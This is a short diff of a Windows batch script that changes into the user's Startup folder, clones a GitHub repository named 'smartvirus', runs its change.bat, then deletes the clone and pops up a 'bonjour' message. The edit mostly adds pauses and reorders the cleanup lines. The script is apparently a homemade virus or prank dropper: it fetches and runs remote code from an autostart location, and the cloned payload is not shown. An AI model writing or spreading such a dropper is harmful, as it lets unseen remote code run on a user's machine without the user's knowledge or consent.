@@ -1,11 +1,9 @@
-echo off
-cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
-timeout 2
-rmdir /s /q smartvirus
+cd AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+pause
 git clone https://github.com/mattistjnn/smartvirus
 cd smartvirus
-start change.bat
-cd ..
-rmdir /s /q smartvirus 
+Start change.bat
 pause
+cd ..
+rmdir /s /q smartvirus
 msg * "bonjour"
